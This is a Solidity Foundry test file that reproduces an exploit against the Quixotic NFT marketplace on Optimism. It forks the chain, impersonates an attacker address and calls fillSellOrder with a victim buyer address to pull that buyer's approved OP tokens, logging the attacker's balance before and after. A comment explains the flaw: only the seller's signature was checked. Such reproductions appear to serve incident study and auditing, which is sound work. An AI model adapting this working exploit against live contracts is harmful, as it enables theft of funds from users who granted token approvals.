// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface Quixotic {
    function fillSellOrder(
        address seller,
        address contractAddress,
        uint256 tokenId,
        uint256 startTime,
        uint256 expiration,
        uint256 price,
        uint256 quantity,
        uint256 createdAtBlockNumber,
        address paymentERC20,
        bytes memory signature,
        address buyer
    ) external payable;
}

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 op = IERC20(0x4200000000000000000000000000000000000042);
    Quixotic quixotic = Quixotic(0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("optimism", 13_591_383); //fork optimism at block 13591383
    }

    function testExploit() public {
        cheat.prank(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5);
        emit log_named_uint(
            "Before exploiting, attacker OP Balance:", op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)
        );
        quixotic.fillSellOrder(
            0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5,
            0xbe81eabDBD437CbA43E4c1c330C63022772C2520,
            1,
            0,
            115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_934,
            2_736_191_871_050_436_050_944,
            1,
            115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_934,
            0x4200000000000000000000000000000000000042,
            hex"28bc2ff1634b13821eac466ef6875c44f1f556d00d3cafce02da07b217da395131294339d96a01922b83f8e3c67e74652198b3a6db79d7ddd48807b9ec6ae0491c",
            0x4D9618239044A2aB2581f0Cc954D28873AFA4D7B
        );
        emit log_named_uint(
            "After exploiting, attacker OP Balance:", op.balanceOf(0x0A0805082EA0fc8bfdCc6218a986efda6704eFE5)
        );

        //issues was only check seller signature
        //require(_validateSellerSignature(sellOrder, signature),
    }

    receive() external payable {}
}
